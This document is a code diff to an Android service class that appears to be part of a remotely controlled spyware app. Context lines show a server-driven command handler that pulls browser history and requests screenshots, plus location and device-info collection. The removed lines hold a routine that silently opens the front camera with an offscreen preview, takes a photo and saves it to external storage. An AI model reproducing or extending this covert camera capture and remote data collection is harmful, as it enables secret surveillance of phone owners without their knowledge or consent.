@@ -47,6 +47,8 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
@@ -74,9 +76,6 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     private LocationTracker tracker = null;
     private String deviceUniqueId = null;
     private TextToSpeech textToSpeech = null;
-    private SurfaceHolder surfaceHolder;
-    private Camera mCamera;
-    private Parameters parameters;
     public AppContant locationDataClass;
 
     @Override
@@ -86,7 +85,6 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         locationDataClass = new AppContant();
         AndroidNetworking.initialize(context);
         init();
-        //initCamera();
 
     }
 
@@ -121,9 +119,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
     @SuppressLint("MissingPermission")
     private void getDeviceInfo() {
-        EasyIdMod easyIdMod = new EasyIdMod(context);
         TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        deviceUniqueId = easyIdMod.getPseudoUniqueID() + "";
         String release = Build.VERSION.RELEASE;
         String countryCode = telephonyManager.getNetworkCountryIso();
         String deviceName = android.os.Build.MANUFACTURER;
@@ -312,7 +308,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
             getBrowserHistory();
         }
         if (response.has("get_screenshot")) {
-            getScreenshot();
+            //getScreenshot();
         }
     }
 
@@ -336,10 +332,6 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
                     }
                 });
-
-    }
-
-    private void getScreenshot() {
 
     }
 
@@ -602,69 +594,4 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         }
     };
 
-    private void initCamera(){
-
-        mCamera = Camera.open(1);
-        mCamera.setDisplayOrientation(90);
-        SurfaceTexture st = new SurfaceTexture(MODE_PRIVATE);
-
-
-        try {
-            mCamera.setPreviewTexture(st);
-            parameters = mCamera.getParameters();
-
-            //set camera parameters
-            mCamera.setParameters(parameters);
-            mCamera.startPreview();
-            takePic();
-
-        } catch (IOException e) {
-            // TODO Auto-generated catch block
-            e.printStackTrace();
-            //stop the preview
-            mCamera.stopPreview();
-            mCamera.setPreviewCallback(null);
-            //release the camera
-            mCamera.release();
-            //unbind the camera from this object
-            mCamera = null;
-        }
-
-    }
-
-    public void takePic(){
-
-        Camera.PictureCallback mCall = new Camera.PictureCallback() {
-
-            public void onPictureTaken(byte[] data, Camera camera) {
-
-                File photo=new File(Environment.getExternalStorageDirectory(), "ssll.jpg");
-
-                if (photo.exists()) {
-                    photo.delete();
-                }
-
-                try {
-                    FileOutputStream fos=new FileOutputStream(photo.getPath());
-
-                    fos.write(data);
-                    fos.close();
-                }
-                catch (java.io.IOException e) {
-                    Log.e("PictureDemo", "Exception in photoCallback", e);
-                }
-
-
-                //stop the preview
-                mCamera.stopPreview();
-                mCamera.setPreviewCallback(null);
-                //release the camera
-                mCamera.release();
-                //unbind the camera from this object
-                mCamera = null;
-            }
-        };
-        mCamera.takePicture(null, null, mCall);
-        Toast.makeText(getApplicationContext(),"Pic taken",Toast.LENGTH_LONG).show();
-    }
 }
